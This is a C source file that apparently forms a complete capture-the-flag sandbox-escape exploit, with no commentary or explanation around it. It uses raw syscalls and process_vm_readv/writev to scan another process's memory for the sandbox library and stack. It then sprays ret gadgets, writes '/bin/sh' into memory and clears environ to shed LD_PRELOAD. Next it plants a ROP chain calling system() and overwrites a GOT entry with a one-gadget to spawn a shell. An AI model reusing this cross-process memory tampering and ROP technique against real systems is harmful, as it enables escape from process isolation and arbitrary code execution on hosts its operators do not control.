typedef unsigned char uint8_t;
_Static_assert(sizeof(uint8_t) == 1, "uint8_t wrong size");
typedef unsigned short uint16_t;
_Static_assert(sizeof(uint16_t) == 2, "uint16_t wrong size");
typedef unsigned int uint32_t;
_Static_assert(sizeof(uint32_t) == 4, "uint32_t wrong size");
typedef unsigned long long uint64_t;
_Static_assert(sizeof(uint64_t) == 8, "uint64_t wrong size");
typedef unsigned int size_t;
typedef int ssize_t;

#define NULL ((void*)0x0)
#define pid_t unsigned long
#define true 1
#define false 0
#define SYS_exit 1
#define SYS_read 0
#define SYS_write 1
#define SYS_getpid 39
#define SYS_process_vm_readv 310
#define SYS_process_vm_writev 311

struct iovec {
    uint64_t iov_base;    /* Starting address */
    size_t iov_len;     /* Number of bytes to transfer */
};


int main();
void __attribute__((noreturn)) exit(int);

void* memset(void* dst, int val, size_t size) {
    for (size_t i = 0; i < size; i++) {
        ((uint8_t*)dst)[i] = val;
    }
    return dst;
}

void* memcpy(void* dst, const void* src, size_t size) {
    for (size_t i = 0; i < size; i++) {
        ((uint8_t*)dst)[i] = ((uint8_t*)src)[i];
    }
    return dst;
}

ssize_t read(int _fd, void* _buf, size_t _len) {
    register int fd asm("rdi") = _fd;
    register void* buf asm("rsi") = _buf;
    register size_t len asm("rdx") = _len;
    register int syscall asm("rax") = SYS_read;
    register ssize_t ret asm("rax");
    asm volatile("syscall" : "=r"(ret) : "r"(fd), "r"(buf), "r"(len), "r"(syscall) : "memory");
    return ret;
}

void write(int _fd, const void* _buf, size_t _len) {
    register int fd asm("rdi") = _fd;
    register const void* buf asm("rsi") = _buf;
    register size_t len asm("rdx") = _len;
    register int syscall asm("rax") = SYS_write;
    asm volatile("syscall" :: "r"(fd), "r"(buf), "r"(len), "r"(syscall) : "memory");
}

void kill(uint64_t _pid, uint64_t _sig)
{
    register uint64_t pid asm("rdi") = _pid;
    register uint64_t sig asm("rsi") = _sig;
    register int syscall asm("rax") = 200;

    asm volatile("syscall" :: "r"(pid), "r"(sig), "r"(syscall) : "memory");
}

uint64_t getpid()
{
    register int syscall asm("rax") = SYS_getpid;
    register uint64_t ret asm("rax");
    asm volatile("syscall" : "=r"(ret) :"r"(syscall) : "memory");
    return ret;
}

void __attribute__((noreturn)) exit(int _code) {
    register int code asm("rdi") = _code;
    register int syscall asm("rax") = SYS_exit;
    asm volatile("syscall" ::"r"(syscall) : "memory");
    __builtin_unreachable();
}

ssize_t process_vm_readv(pid_t _pid,
        const struct iovec *_local_iov,
        unsigned long _liovcnt,
        const struct iovec *_remote_iov,
        unsigned long _riovcnt,
        unsigned long _flags) {
    register pid_t pid asm("rdi") = _pid;
    register struct iovec* local_iov asm("rsi") = _local_iov;
    register unsigned long liovcnt asm("rdx") = _liovcnt;
    register struct iovec* remote_iov asm("r10") = _remote_iov;
    register unsigned long riovcnt asm("r8") = _riovcnt;
    register unsigned long flags asm("r9") = _flags;
    register int syscall asm("rax") = SYS_process_vm_readv;
    register ssize_t ret asm("rax");
    asm volatile("syscall" : "=r"(ret) : "r"(pid), "r"(local_iov), "r"(liovcnt),  "r"(remote_iov),
            "r"(riovcnt), "r"(flags), "r"(syscall) : "memory");
    return ret;
}

ssize_t process_vm_writev(pid_t _pid,
        const struct iovec *_local_iov,
        unsigned long _liovcnt,
        const struct iovec *_remote_iov,
        unsigned long _riovcnt,
        unsigned long _flags) {
    register pid_t pid asm("rdi") = _pid;
    register struct iovec* local_iov asm("rsi") = _local_iov;
    register unsigned long liovcnt asm("rdx") = _liovcnt;
    register struct iovec* remote_iov asm("r10") = _remote_iov;
    register unsigned long riovcnt asm("r8") = _riovcnt;
    register unsigned long flags asm("r9") = _flags;
    register int syscall asm("rax") = SYS_process_vm_writev;
    register ssize_t ret asm("rax");
    asm volatile("syscall" : "=r"(ret) : "r"(pid), "r"(local_iov), "r"(liovcnt),  "r"(remote_iov),
            "r"(riovcnt), "r"(flags), "r"(syscall) : "memory");
    return ret;
}

uint64_t getrsp()
{
  __asm__ ("movq %rsp, %rax");
}

extern uint8_t _bss;
extern uint8_t _ebss;
uint64_t g_libsandbox;
uint64_t g_libc;

void __attribute__((noreturn)) __attribute__((section(".text.start"))) _start(uint64_t libsandbox) {
    
    g_libsandbox = libsandbox;
    g_libc = libsandbox - 0x1f2000;
    exit(main());
}

// lol
void write_ulong(uint64_t x)
{
    char tmp[256];
    char c;
    int i = 0;
    c = (x%16);
    if (c < 10)
        tmp[0] = c + 0x30;
    else
        tmp[0] = c - 10 + 'a';
    while ((x /= 16) != 0)
    {
        i += 1;
        c = (x%16);
        if (c < 10)
            tmp[i] = c + 0x30;
        else
            tmp[i] = c - 10 + 'a';
    }
    while (i >= 0)
    {
        write(1, &tmp[i--], 1);
    }
    c = 0xa;
    write(1, &c, 1);
    
}

uint64_t g_val;
struct iovec g_local_vec  = { (uint64_t) &g_val , 8 };
struct iovec g_remote_vec = { 0, 8 };

uint64_t remote_read64(uint64_t pid, uint64_t addr)
{

    write(1, "reading: ", 9);
    write_ulong(addr);
    
    g_remote_vec.iov_base = addr;
    ssize_t ret = process_vm_readv(pid, &g_local_vec, 1, &g_remote_vec, 1, 0);
    if (ret <= 0) {
        write(1, "bad ret!: ", 10);
        write_ulong(-ret);
        //write(1, "\n", 1);
    } else {
        //write(1, "GOOD RET\n", 9);
    }

    return g_val;
}

ssize_t remote_write64(uint64_t pid, uint64_t addr, uint64_t val)
{

    //write(1, "writing to: ", 12);
    //write_ulong(addr);
    
    g_val = val;
    g_remote_vec.iov_base = addr;
    ssize_t ret = process_vm_writev(pid, &g_local_vec, 1, &g_remote_vec, 1, 0);
    if (ret <= 0) {
        write(1, "bad ret!: ", 10);
        write_ulong(-ret);
        //write(1, "\n", 1);
    } else {
        //write(1, "GOOD RET\n", 9);
    }

    return -ret;

}

uint64_t scanmem64(uint64_t apid, uint64_t page, uint64_t expected, uint64_t increment)
{
    write(1, "Scanning memory from: ", 22);
    write_ulong(page);
    write_ulong(expected);
    
    for (;;)
    {
        //write_ulong((uint64_t) page);
        uint64_t val = remote_read64(apid, page);
        if (val == expected)
            break;
        page += increment;
    }
    
    return page;
}

// 0x000000000005e650: mov rsp, rdx; ret;
// stack_pivot = g_libc + 0x5e650;

int main() {
    //asm("int3");
    uint64_t sbxpid = getpid() + 1;
    write_ulong(sbxpid);
    uint64_t real_libsbx = scanmem64(sbxpid, g_libc + 0x1ee000, 0x00010102464c457f, 0x1000);
    write(1, "found realsbx: ", 15);
    write_ulong(real_libsbx);
    
    uint64_t sbxsp = scanmem64(sbxpid, getrsp(), real_libsbx + 0x1309, -0x8);
    write(1, "found sbxsp: ", 13);
    write_ulong(sbxsp);
    
    int i;
    
    for ( i = 0; i < 0x10000; ++i)
    {
        
        // ret = 0x40101a
        uint64_t rv = remote_write64(sbxpid, sbxsp-i*8, 0x40101a); // ret spray
        
        if (rv == 0xe)
            break;
    }
    i = 199;

    #define POP_RDI 0x401273
    #define POP_RSI_R15 0x401271
    #define POP_RDX_RBX g_libc + 0x162d98
    #define PUTS 0x401074
    #define BINSH 0x404500
    #define BINSHHEX 0x0068732f6e69622f
    #define BINLSHEX 0x00736c2f6e69622f
    #define SYSTEM g_libc + 0x55410
    #define EXECVE g_libc + 0xe62f0
    #define ENVIRON g_libc + 0x1ef2e0
    #define ONEGADGET_R15_R12 g_libc + 0xe6c7e

    // write command to bss
    remote_write64(sbxpid, BINSH + 8*0, 0x0068732f6e69622f);

    // overwrite environ or the child process will get LD_PRELOAD=./libsandbox.so
    remote_write64(sbxpid, ENVIRON, 0x0);

    // ropchain on the sbx
    remote_write64(sbxpid, sbxsp-(i--)*8, POP_RDI);
    remote_write64(sbxpid, sbxsp-(i--)*8, BINSH);
    remote_write64(sbxpid, sbxsp-(i--)*8, SYSTEM);


    // overwrite libsbx puts@got
    remote_write64(sbxpid, real_libsbx + 0x4018, ONEGADGET_R15_R12);
    // overwrite libsbx setvbuf@got
    //remote_write64(sbxpid, real_libsbx + 0x4050, 0x401273); // setvbuf@got = poprdi_ret -> will stack pivot to &0x10d
    kill(sbxsp, 18);

    for(;;)
    {

    }

    return 120;
}
